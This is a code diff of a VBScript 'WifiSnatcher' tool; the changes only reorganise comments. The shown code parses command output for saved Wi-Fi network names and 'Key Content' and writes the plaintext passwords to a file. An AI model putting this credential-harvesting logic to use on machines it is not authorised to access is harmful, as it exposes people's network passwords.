@@ -1,6 +1,6 @@
 ' Wifi snatcher tool
 Option Explicit
-
+' Declaration 
 Dim objShell,objFso,objExec,objFile
 Dim wifiName, wifiPassword,command,strLine
 
@@ -18,21 +18,19 @@ objFile.Writeline "                WifiSnatcher                 "
 objFile.Writeline "============================================="
 objFile.Writeline "                                   -TEdtr    "
 
+' Output Wi-Fi name and password 
 Do While Not objExec.StdOut.AtEndOfStream
     strLine = objExec.StdOut.ReadLine()
     
-    ' Output Wi-Fi name and password 
-       If InStr(strLine, "SSID name")>0  Then
-       
-        ' Extract Wi-Fi name
+       ' Extract Wi-Fi name
+       If InStr(strLine, "SSID name")>0  Then 
         wifiName = Trim(Split(strLine, ":")(1))
         objFile.Writeline "--------------------------------------------"
         objFile.Writeline "Wi-Fi Name: " & wifiName
        End If
-
-        If InStr(strLine, "Key Content") > 0 Then
-         
-        ' Extract Wi-Fi password
+    
+       ' Extract Wi-Fi password
+        If InStr(strLine, "Key Content") > 0 Then         
          wifiPassword = Trim(Split(strLine, ":")(1)) 
          objFile.Writeline "Password: " & wifiPassword     
         End If
